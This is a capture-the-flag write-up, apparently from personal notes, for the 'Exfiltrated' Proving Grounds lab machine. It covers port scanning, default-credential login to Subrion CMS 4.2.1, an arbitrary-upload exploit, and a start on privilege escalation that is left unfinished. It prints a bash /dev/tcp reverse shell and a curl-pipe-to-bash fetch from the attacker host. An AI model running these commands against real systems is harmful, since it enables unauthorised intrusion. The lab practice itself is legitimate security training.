---
description: 11/22/2021
---

# Exfiltrated (Easy)

## Information Gathering

Scanned all TCP ports:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1994b952225ed0f8520d363b448bbcf (RSA)
|   256 0f448badad95b8226af036ac19d00ef3 (ECDSA)
|_  256 32e12a6ccc7ce63e23f4808d33ce9b3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
|_http-favicon: Unknown favicon MD5: 09BDDB30D6AE11E854BFF82ED638542B
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Enumerated UDP ports:

```
All 1000 scanned ports on exfiltrated.offsec (192.168.90.163) are in ignored states.
```

Notes:

* 80/HTTP - <mark style="color:yellow;">added exfiltrated.offsec to /etc/hosts</mark>
  * CMS- Subrion -- Can we enumerate the version? -- Yes, <mark style="color:yellow;">v4.2.1</mark>
  * Apache 2.4.41
* Perform quick win attempt with searchsploit on both services above

## Enumeration

### Port 80 - HTTP (Apache) -- exfiltrated.offsec

Visual Inspection:

<figure><img src="../../../.gitbook/assets/image (7) (2) (3).png" alt=""><figcaption></figcaption></figure>

Wappalyzer:

<figure><img src="../../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

Searchsploit results of Subrion CMS:

<figure><img src="../../../.gitbook/assets/image (3) (3) (3).png" alt=""><figcaption></figcaption></figure>

Enumerated Subrion Version:

* Found via selecting the "Go to admin dashboard" button on the main site

<figure><img src="../../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

* Version has been enumerated <mark style="color:yellow;">Subrion v4.2.1</mark>
* We have 4 exploits that are targeted towards this version

### Subrion Default Credentials

A simple Google search for Subrion Default Creds gives us this first site with lucrative and guessable information

<figure><img src="../../../.gitbook/assets/image (5) (10).png" alt=""><figcaption></figcaption></figure>

* <mark style="color:yellow;">Attempted admin/admin login and it worked!</mark>

### Subrion Admin Panel

<figure><img src="../../../.gitbook/assets/image (13) (1) (3).png" alt=""><figcaption></figcaption></figure>

## Exploitation

### 49876.py (Arbitrary File Upload)

<figure><img src="../../../.gitbook/assets/image (4) (12).png" alt=""><figcaption></figcaption></figure>

* Viewed the python exploit in gedit to ensure I was using the proper syntax!
* I also had to copy/paste the explicit directory from the URL bar to the terminal for it to get the correct path (side note)
* However, this shell was really buggy so I ended up transferring a bash reverse shell to upgrade my shell

### Upgrading Web Shell -> Reverse Shell

Create bash reverse shell (rev\_shell):

```
#!/bin/bash
bash -i >& /dev/tcp/192.168.49.90/1337 0>&1
```

Start Netcat listener:

```
nc -lnvp 1337
```

Start HTTP server on Kali:

```
python3 -m http.server 80
```

Transfer w/ curl:

```
curl 192.168.49.90/rev_shell | bash
```

<figure><img src="../../../.gitbook/assets/image (27) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (17) (5).png" alt=""><figcaption><p>Terminator Command Window</p></figcaption></figure>

Upgrade Shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

* Time to priv esc!

## Privilege Escalation

### Local enumeration

<mark style="color:yellow;">Cronjobs</mark>

```
cat /etc/crontab
```

<figure><img src="../../../.gitbook/assets/image (20) (4).png" alt=""><figcaption></figcaption></figure>

* <mark style="color:yellow;">/opt/image-exif.sh</mark> looks interesting
* I tried to replace the file and delete it with no luck

{% embed url="https://grumpygeekwrites.wordpress.com/2021/09/07/offensive-security-pg-practice-exfiltrated-walk-through-tutorial-writeup/" %}

### PrivEsc vector

## Proofs
